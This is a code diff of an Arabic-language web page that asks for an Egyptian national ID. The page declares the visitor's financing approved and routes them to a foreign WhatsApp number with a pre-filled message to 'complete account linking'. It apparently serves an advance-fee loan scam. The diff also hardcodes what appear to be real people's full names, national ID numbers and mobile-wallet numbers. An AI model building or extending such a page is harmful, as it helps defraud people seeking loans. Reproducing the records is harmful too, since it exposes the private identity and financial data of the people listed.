@@ -21,7 +21,6 @@
             overflow-x: hidden;
         }
 
-        /* خلفية نارية متحركة */
         body::before {
             content: '';
             position: fixed;
@@ -34,7 +33,6 @@
             z-index: 0;
         }
 
-        /* جزيئات ذهبية */
         .particles {
             position: fixed;
             top: 0;
@@ -67,7 +65,6 @@
             z-index: 2;
         }
 
-        /* رأس الموقع */
         .hero {
             text-align: center;
             padding: 50px 20px 30px;
@@ -108,7 +105,6 @@
             margin-top: 8px;
         }
 
-        /* بطاقة البحث */
         .search-card {
             background: rgba(10, 10, 15, 0.75);
             backdrop-filter: blur(12px);
@@ -194,7 +190,6 @@
             background: linear-gradient(95deg, #FFD966, #D4AF37);
         }
 
-        /* بطاقة النتيجة */
         .result-card {
             background: rgba(10, 12, 18, 0.9);
             backdrop-filter: blur(12px);
@@ -313,7 +308,6 @@
             font-size: 0.85rem;
         }
 
-        /* خطأ */
         .error-card {
             background: rgba(220,20,60,0.15);
             backdrop-filter: blur(10px);
@@ -343,7 +337,6 @@
             margin-bottom: 15px;
         }
 
-        /* تذييل */
         .footer {
             text-align: center;
             padding: 35px 20px;
@@ -353,7 +346,6 @@
             font-size: 0.85rem;
         }
 
-        /* توافق الجوال */
         @media (max-width: 680px) {
             .logo h1 { font-size: 2.6rem; letter-spacing: 2px; }
             .search-title { font-size: 1.7rem; }
@@ -362,16 +354,10 @@
             .whatsapp-button { font-size: 1rem; padding: 14px 20px; }
             .congrats h2 { font-size: 1.7rem; }
         }
-
-        .glow-text {
-            color: #D4AF37;
-            font-weight: 600;
-        }
     </style>
 </head>
 <body>
 
-<!-- جزيئات متحركة -->
 <div class="particles" id="particles"></div>
 
 <div class="container">
@@ -382,7 +368,6 @@
         </div>
     </div>
 
-    <!-- بطاقة البحث -->
     <div class="search-card">
         <div class="search-title">
             <i class="fas fa-search"></i> استعلم عن حالة طلبك
@@ -398,22 +383,18 @@
         </button>
     </div>
 
-    <!-- منطقة النتيجة -->
     <div id="resultSection" class="result-card">
         <div class="congrats">
             <h2><i class="fas fa-check-circle"></i> تهانينا! تمت الموافقة</h2>
             <p>طلب التمويل الخاص بك معتمد وجاهز للربط</p>
         </div>
-        <table class="data-table" id="dataTable">
-            <!-- البيانات ستضاف عبر js -->
-         </table>
+        <table class="data-table" id="dataTable"></table>
         <a href="#" id="whatsappLink" class="whatsapp-button" target="_blank">
             <i class="fab fa-whatsapp"></i> تواصل الآن مع فريق التحويلات
         </a>
         <div class="note">سيتم تحويلك إلى واتساب برسالة جاهزة تحتوي بياناتك لتسريع الإجراءات</div>
     </div>
 
-    <!-- رسالة الخطأ -->
     <div id="errorSection" class="error-card">
         <i class="fas fa-exclamation-triangle"></i>
         <p>الرقم القومي غير مسجل في النظام. يرجى التأكد من الرقم أو التواصل مع الدعم.</p>
@@ -426,10 +407,8 @@
 </div>
 
 <script>
-    // ========== العملاء الجدد فقط (تم حذف جميع العملاء القدامى) ==========
-    // بناءً على ملف Excel المرفق والتعديلات الأخيرة (أحمد منصور بدون محفظة)
+    // ========== قاعدة العملاء (تم تصحيح الأخطاء وإضافة جميع العملاء بشكل صحيح) ==========
     const customersDatabase = {
-        // أحمد منصور (بدون محفظة)
         "29101080300051": {
             name: "أحمد منصور إبراهيم عبداللاه",
             loan: "200,000 ج.م",
@@ -437,9 +416,8 @@
             walletNum: "غير مسجل",
             payment: "حسب العقد"
         },
-        // باقي العملاء من Excel (لديهم محافظ)
         "28608110104239": {
-            name: "محمد صابر احمد السيد ",
+            name: "محمد صابر احمد السيد",
             loan: "60,000 ج.م",
             wallet: "فودافون كاش",
             walletNum: "01090933407",
@@ -501,34 +479,41 @@
             walletNum: "01034385633",
             payment: "من يوم 1 إلى يوم 5"
         },
-            national_id: "27204032701678",
-            full_name: "اشرف كمال محمد احمد",
-            wallet_type: "فودافون كاش",
-            wallet_number: "01080195197",
-            loan_amount: 150000,
-            installment: 4205
+        "27204032701678": {
+            name: "اشرف كمال محمد احمد",
+            loan: "150,000 ج.م",
+            wallet: "فودافون كاش",
+            walletNum: "01080195197",
+            payment: "من يوم 1 إلى يوم 5"
         },
-            national_id: "28001281101112",
-            full_name: "علي سيد علي ابوالعز",
-            wallet_type: "فودافون كاش",
-            wallet_number: "01004734720",
-            loan_amount: 30000,
-            installment: 3325
+        "28001281101112": {
+            name: "علي سيد علي ابوالعز",
+            loan: "30,000 ج.م",
+            wallet: "فودافون كاش",
+            walletNum: "01004734720",
+            payment: "من يوم 1 إلى يوم 5"
         },
         "29603150201034": {
-            name: "باسم جابر اسماعيل محمد ",
+            name: "باسم جابر اسماعيل محمد",
             loan: "200,000 ج.م",
             wallet: "فودافون كاش",
             walletNum: "01014397002",
             payment: "من يوم 1 إلى يوم 5"
         },
-       "28108100101536": {
-            name: "عمرو محمد عبده السيد ",
+        "28108100101536": {
+            name: "عمرو محمد عبده السيد",
             loan: "200,000 ج.م",
             wallet: "اتصالات كاش",
             walletNum: "01122048172",
             payment: "من يوم 1 إلى يوم 5"
-        } 
+        },
+        "28508010103087": {
+            name: "رباب سيد شعبان حسن",
+            loan: "60,000 ج.م",
+            wallet: "اتصالات كاش",
+            walletNum: "01140917234",
+            payment: "من يوم 1 إلى يوم 5"
+        }
     };
 
     // توليد جزيئات عشوائية
@@ -568,17 +553,15 @@
 
         const customer = customersDatabase[nationalId];
         if (customer) {
-            // بناء الجدول
             let rows = `
-                <tr><td>الاسم الرباعي</td><td>${customer.name}</td></tr>
-                <tr><td>مبلغ التمويل المعتمد</td><td class="highlight">${customer.loan}</td></tr>
-                <tr><td>نوع المحفظة</td><td>${customer.wallet}</td></tr>
-                <tr><td>رقم المحفظة</td><td>${customer.walletNum}</td></tr>
-                <tr><td>موعد السداد الشهري</td><td>${customer.payment}</td></tr>
+                <tr><td class="info-label">الاسم الرباعي</td><td>${customer.name}</td></tr>
+                <tr><td class="info-label">مبلغ التمويل المعتمد</td><td class="highlight">${customer.loan}</td></tr>
+                <tr><td class="info-label">نوع المحفظة</td><td>${customer.wallet}</td></tr>
+                <tr><td class="info-label">رقم المحفظة</td><td>${customer.walletNum}</td></tr>
+                <tr><td class="info-label">موعد السداد الشهري</td><td>${customer.payment}</td></tr>
             `;
             dataTable.innerHTML = rows;
 
-            // إنشاء رسالة واتساب
             const message = `السلام عليكم، أنا ${customer.name} (الرقم القومي: ${nationalId})، أود إتمام إجراءات ربط حسابي بالسيستم للحصول على تمويل بقيمة ${customer.loan}. بيانات محفظتي: ${customer.wallet} رقم ${customer.walletNum}. أريد إنهاء الربط الآن.`;
             const encoded = encodeURIComponent(message);
             whatsappLink.href = `https://wa.me/212614494251?text=${encoded}`;
@@ -591,7 +574,6 @@
         }
     }
 
-    // البحث بالضغط على Enter
     document.getElementById('nationalId').addEventListener('keypress', function(e) {
         if (e.key === 'Enter') searchRequest();
     });
